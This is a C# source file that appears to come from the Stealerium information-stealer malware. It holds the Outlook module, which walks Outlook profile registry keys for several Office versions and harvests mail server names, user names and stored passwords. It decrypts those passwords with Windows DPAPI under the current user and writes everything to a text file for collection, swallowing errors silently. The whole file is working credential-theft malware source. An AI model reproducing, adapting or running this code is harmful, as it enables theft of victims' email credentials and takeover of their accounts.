using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers
{
    internal sealed class Outlook
    {
        private static readonly Regex MailClient =
            new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");

        private static readonly Regex SmptClient =
            new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");

        public static void GrabOutlook(string sSavePath)
        {
            string[] regDirecories =
            {
                "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
            };

            string[] mailClients =
            {
                "SMTP Email Address", "SMTP Server", "POP3 Server",
                "POP3 User Name", "SMTP User Name", "NNTP Email Address",
                "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
                "Email", "HTTP User", "HTTP Server URL", "POP3 User",
                "IMAP User", "HTTPMail User Name", "HTTPMail Server",
                "SMTP User", "POP3 Password2", "IMAP Password2",
                "NNTP Password2", "HTTPMail Password2", "SMTP Password2",
                "POP3 Password", "IMAP Password", "NNTP Password",
                "HTTPMail Password", "SMTP Password"
            };

            var data = regDirecories.Aggregate("", (current, dir) => current + Get(dir, mailClients));

            if (string.IsNullOrEmpty(data)) return;
            Counter.Outlook = true;
            Directory.CreateDirectory(sSavePath);
            File.WriteAllText(sSavePath + "\\Outlook.txt", data + "\r\n");
        }

        private static string Get(string path, string[] clients)
        {
            var data = "";
            try
            {
                foreach (var client in clients)
                    try
                    {
                        var value = GetInfoFromRegistry(path, client);
                        if (value != null && client.Contains("Password") && !client.Contains("2"))
                            data += $"{client}: {DecryptValue((byte[]) value)}\r\n";
                        else if (value != null &&
                                 (SmptClient.IsMatch(value.ToString()) || MailClient.IsMatch(value.ToString())))
                            data += $"{client}: {value}\r\n";
                        else
                            data +=
                                $"{client}: {Encoding.UTF8.GetString((byte[]) value).Replace(Convert.ToChar(0).ToString(), "")}\r\n";
                    }
                    catch
                    {
                        // ignored
                    }

                var key = Registry.CurrentUser.OpenSubKey(path, false);
                if (key != null)
                {
                    var Clients = key.GetSubKeyNames();

                    data = Clients.Aggregate(data,
                        (current, client) => current + $"{Get($"{path}\\{client}", clients)}");
                }
            }
            catch
            {
                // ignored
            }

            return data;
        }

        private static object GetInfoFromRegistry(string path, string valueName)
        {
            object value = null;
            try
            {
                var registryKey = Registry.CurrentUser.OpenSubKey(path, false);
                if (registryKey != null)
                {
                    value = registryKey.GetValue(valueName);
                    registryKey.Close();
                }
            }
            catch
            {
                // ignored
            }

            return value;
        }

        private static string DecryptValue(byte[] encrypted)
        {
            try
            {
                var decoded = new byte[encrypted.Length - 1];
                Buffer.BlockCopy(encrypted, 1, decoded, 0, encrypted.Length - 1);
                return Encoding.UTF8.GetString(
                        ProtectedData.Unprotect(
                            decoded, null, DataProtectionScope.CurrentUser))
                    .Replace(Convert.ToChar(0).ToString(), "");
            }
            catch
            {
                // ignored
            }

            return "null";
        }
    }
}